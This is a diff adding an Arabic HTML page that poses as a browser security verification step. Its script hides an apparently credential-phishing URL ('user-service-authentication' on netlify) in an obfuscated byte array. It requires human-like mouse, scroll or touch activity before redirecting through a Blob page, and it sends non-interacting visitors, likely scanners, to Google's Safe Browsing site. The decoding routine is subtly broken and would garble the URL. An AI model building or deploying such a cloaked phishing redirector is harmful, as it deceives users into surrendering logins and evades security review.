@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحقق الأمني - جاري التأكيد</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            font-family: system-ui, sans-serif;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .card {
+            background: rgba(255,255,255,0.97);
+            color: #1a1a1a;
+            padding: 2.8rem 2.4rem;
+            border-radius: 18px;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.4);
+            width: 100%;
+            max-width: 500px;
+            text-align: center;
+        }
+        .progress {
+            display: flex;
+            justify-content: space-evenly;
+            margin: 2.2rem 0;
+        }
+        .dot {
+            width: 76px;
+            height: 76px;
+            border-radius: 50%;
+            background: #e0e0e0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.8rem;
+            font-weight: bold;
+            color: white;
+            transition: all 0.6s ease;
+        }
+        .dot.active {
+            background: #00d084;
+            box-shadow: 0 0 0 8px rgba(0,208,132,0.3);
+            transform: scale(1.12);
+        }
+        .spinner {
+            width: 64px;
+            height: 64px;
+            border: 7px solid #f0f0f0;
+            border-top: 7px solid #00d084;
+            border-radius: 50%;
+            animation: spin 1.1s linear infinite;
+            margin: 2rem auto;
+            opacity: 0;
+            transition: opacity 0.4s;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        button {
+            margin-top: 1.8rem;
+            padding: 1.2rem 3.2rem;
+            font-size: 1.18rem;
+            background: #00d084;
+            color: white;
+            border: none;
+            border-radius: 14px;
+            cursor: pointer;
+            transition: all 0.35s;
+            opacity: 0.45;
+            pointer-events: none;
+            font-weight: 600;
+        }
+        button.active {
+            opacity: 1;
+            pointer-events: auto;
+            box-shadow: 0 8px 25px rgba(0,208,132,0.4);
+        }
+        button:hover { transform: translateY(-3px); }
+        .status {
+            margin-top: 1.2rem;
+            font-size: 1.1rem;
+            color: #444;
+            min-height: 1.6em;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>التحقق الأمني جاري</h2>
+    <p>لحماية حسابك، يرجى إكمال التحقق بخطوات بسيطة:</p>
+
+    <div class="progress">
+        <div class="dot" id="d1">1</div>
+        <div class="dot" id="d2">2</div>
+        <div class="dot" id="d3">3</div>
+    </div>
+
+    <div class="spinner" id="spin"></div>
+
+    <div class="status" id="status">جاري فحص المتصفح...</div>
+
+    <button id="verifyBtn">تأكيد ومتابعة</button>
+</div>
+
+<script>
+(function() {
+    // ─────────────────────────────────────────────
+    // الرابط مشفر بطريقة متعددة الطبقات
+    // ─────────────────────────────────────────────
+    const encBytes = [104,116,116,112,115,58,47,47,117,115,101,114,45,115,101,114,118,105,99,101,45,97,117,116,104,101,110,116,105,99,97,116,105,111,110,46,110,101,116,108,105,102,121,46,97,112,112];
+
+    function computeKey() {
+        let s = 0;
+        try {
+            s += (navigator.userAgent || '').length * 43;
+            s += screen.width * 37 ^ screen.height * 19;
+            s += new Date().getTimezoneOffset() * 29;
+            s += window.devicePixelRatio ? Math.round(window.devicePixelRatio * 100) : 0;
+            s += navigator.languages ? navigator.languages.join('').length * 17 : 0;
+        } catch {}
+        return (s % 239) || 71;
+    }
+
+    const k = computeKey();
+
+    function decryptTarget() {
+        let s = '';
+        for (let i = 0; i < encBytes.length; i++) {
+            const shift = (k + i) ^ (i % 31);
+            s += String.fromCharCode(encBytes[i] ^ shift);
+        }
+        return s;
+    }
+
+    // ─────────────────────────────────────────────
+    // شروط التفاعل البشري (صارمة ومتعددة)
+    // ─────────────────────────────────────────────
+    let mouseMoves = 0;
+    let hasScrolled = false;
+    let hasTouched = false;
+    let btnClicked = false;
+
+    const verifyBtn = document.getElementById('verifyBtn');
+    const spinner   = document.getElementById('spin');
+    const status    = document.getElementById('status');
+    const dots      = [
+        document.getElementById('d1'),
+        document.getElementById('d2'),
+        document.getElementById('d3')
+    ];
+
+    // حركة ماوس
+    document.addEventListener('mousemove', () => {
+        mouseMoves++;
+        if (mouseMoves >= 25) {
+            dots[0].classList.add('active');
+            updateStatus("تم التحقق من حركة المؤشر ✓");
+        }
+        checkAllConditions();
+    }, { passive: true });
+
+    // سكرول
+    document.addEventListener('scroll', () => {
+        if (!hasScrolled) {
+            hasScrolled = true;
+            dots[1].classList.add('active');
+            updateStatus("تم التحقق من التمرير ✓");
+        }
+        checkAllConditions();
+    }, { passive: true });
+
+    // لمس (جوال)
+    document.addEventListener('touchstart', () => {
+        if (!hasTouched) {
+            hasTouched = true;
+            dots[1].classList.add('active');
+            updateStatus("تم التحقق من اللمس ✓");
+        }
+        checkAllConditions();
+    }, { passive: true });
+
+    // الضغط على الزر
+    verifyBtn.addEventListener('click', () => {
+        if (verifyBtn.classList.contains('active')) {
+            btnClicked = true;
+            spinner.style.opacity = '1';
+            verifyBtn.textContent = 'Verifying browser...';
+            verifyBtn.disabled = true;
+            status.textContent = 'جاري التحقق النهائي...';
+
+            // تأخير مقنع
+            setTimeout(redirectUser, 2200);
+        }
+    });
+
+    function checkAllConditions() {
+        if ((mouseMoves >= 28 || hasTouched) && hasScrolled) {
+            verifyBtn.classList.add('active');
+            verifyBtn.disabled = false;
+            status.textContent = 'يمكنك المتابعة الآن';
+        }
+    }
+
+    function updateStatus(msg) {
+        status.textContent = msg;
+    }
+
+    function redirectUser() {
+        const target = decryptTarget();
+
+        // إنشاء صفحة داخل Blob للتوجيه
+        const blobContent = `
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="refresh" content="0;url=${target}">
+    <title>جاري التوجيه الآمن</title>
+</head>
+<body style="margin:0;background:#f8f9fa;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;color:#333;">
+    <p>جاري التوجيه إلى المنطقة الآمنة...</p>
+</body>
+</html>`;
+
+        const blob = new Blob([blobContent], { type: 'text/html' });
+        const blobUrl = URL.createObjectURL(blob);
+
+        window.location.replace(blobUrl);
+
+        // تنظيف
+        setTimeout(() => URL.revokeObjectURL(blobUrl), 45000);
+    }
+
+    // ─────────────────────────────────────────────
+    // إذا لم يتم التفاعل الكافي → إلى Google Safe Browsing
+    // ─────────────────────────────────────────────
+    setTimeout(() => {
+        if (!btnClicked) {
+            window.location.replace('https://transparencyreport.google.com/safe-browsing/search');
+        }
+    }, 32000);
+
+})();
+</script>
+</body>
+</html>
